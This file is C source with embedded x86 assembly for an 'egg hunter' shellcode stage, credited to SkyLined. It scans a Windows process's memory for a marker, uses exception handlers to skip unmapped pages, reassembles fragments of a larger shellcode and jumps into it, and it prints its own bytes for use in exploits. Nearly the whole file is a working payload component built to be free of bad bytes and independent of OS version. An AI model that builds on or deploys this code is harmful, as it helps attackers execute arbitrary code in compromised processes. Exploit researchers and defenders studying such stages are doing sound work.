/*

  SHELLCODE_PART_SIZE = 0-0x7F

  struct block {
    unsigned int marker;
    unsigned int marker;
    byte index;
    char[SHELLCODE_PART_SIZE] shellcode_part;
  }

  SEH_find_shellcode v1.0 by SkyLined <SkyLined@edup.tudelft.nl>
  Small piece of shellcode that finds a larger shellcode that's located at an
  unknown place in memory and executes it.
  Scans for a specific byte sequence ("\x28\x08\x19\x76\x28\x08\x19\x76") that
  marks the start of the larger shellcode. Starts scanning from 0x0 upward and
  skips unmapped memory by using the SEH to detect read errors.
  Goals: 1. Small, 2. OS/SP independant, 3. 0x0, 0xD, 0xA free.
*/
int main(void) {
  __asm__("
#// output the code to stdout
    mov     $end-start, %edx        #// length
    mov     $start, %ecx            #// source
    mov     $0x1, %ebx              #// stdout
    mov     $0x4, %eax              #// write
    int     $0x80
    jmp     end
#// Actual SEH_find_shellcode code:
start:
    xor     %edi, %edi              #// We start scanning at 0x00000000
    jmp     reset_stack

reset_SEH_block:
#// Install the SEH handler and start scanning untill found or interrupted by a
#// read exception when we hit unmapped memory.
#// Remember: fs -> Thread Control Block, with lots of info about our thread
    push    %ebx                    #// next SEH block -> whatever (required ?)
    mov     %esp, %fs:(%eax)        #// Set SEH chain -> Our block

    sub     $-0x76190828, %eax      #// neg marker to prevent false possitives

#// Just doing a 'rep scasl' will miss unalligned markers, this will help:
scan_byte:
    rep     scasb                   #// find a byte that matches
    jne     scan_byte               #// ecx was zero: continue
    dec     %edi
#// And causing SEH's will push EAX (our marker) on the stack. That's why we
#// require it twice, to prevent false possitives.
    scasl
    jne      not_found
    scasl
    jne      not_found
#// We've found a piece and we need to add it to the shellcode. Each part starts
#// with it's own index in the list of parts, each part is of the same size. We
#// can calculate the offset of this piece in the full shellcode from this
#// information:
    lodsb                           #// index
    push    $0x7F                   #// (block size max = 127 bytes)
    pop     %ecx
    mul     %cl                     #// index * size = offset in full shellcode
    cwde                            #// (byte * byte = word. we need dword)
#// We've got the offset, where should we put it ? Bottom of the stack for now.
    xor     %ebx, %ebx
    mov     %fs:0x8(%ebx), %esi     #// esi -> bottom of stack
    xchg    %esi, %edi              #//

// %edi -> dword behind the marker
    jmp     *%edi

not_found:
    sub     $3, %edi
    jmp     scan_byte

reset_stack:
#// Since causing exceptions will eat stack and we might cause a lot, we'll reset
#// it each time after an exception. We will also reset the SEH handler.
#// Remember: fs -> Thread control block, with lots of info about our thread
    cld                             #// scan upward (0x0, 0x1, 0x2, ...)
    xor     %eax, %eax
    mov     %fs:0x4(%eax), %ebx     #// ebx = Top of stack for this thread.
    lea     -0x18(%ebx), %esp       #// Reset stack but reuse the 1st SEH frame
    call    reset_SEH_block         #// Overwrite the SEH handler with ours

SEH_handler:
#// We hit an unmapped memory block, lets skip it and try the next:
    pop     %eax                    #// pop something insignificant
    pop     %eax                    #// eax -> struct with exception info
    lea     0x18(%eax), %esp        #// esp -> The location that can't be read
    pop     %eax                    #// eax = the location that can't be read
    and     $0x7FFFFFFF, %eax       #// eax cannot be negative: wrap to 0
    or      $0xFFF, %ax             #// eax -> last byte in that block
    inc     %eax                    #// eax -> the next block
    mov     %eax, %edi              #// our next block to continue scanning
    jmp     reset_stack
top:

end:
 ");
 exit(0);
}
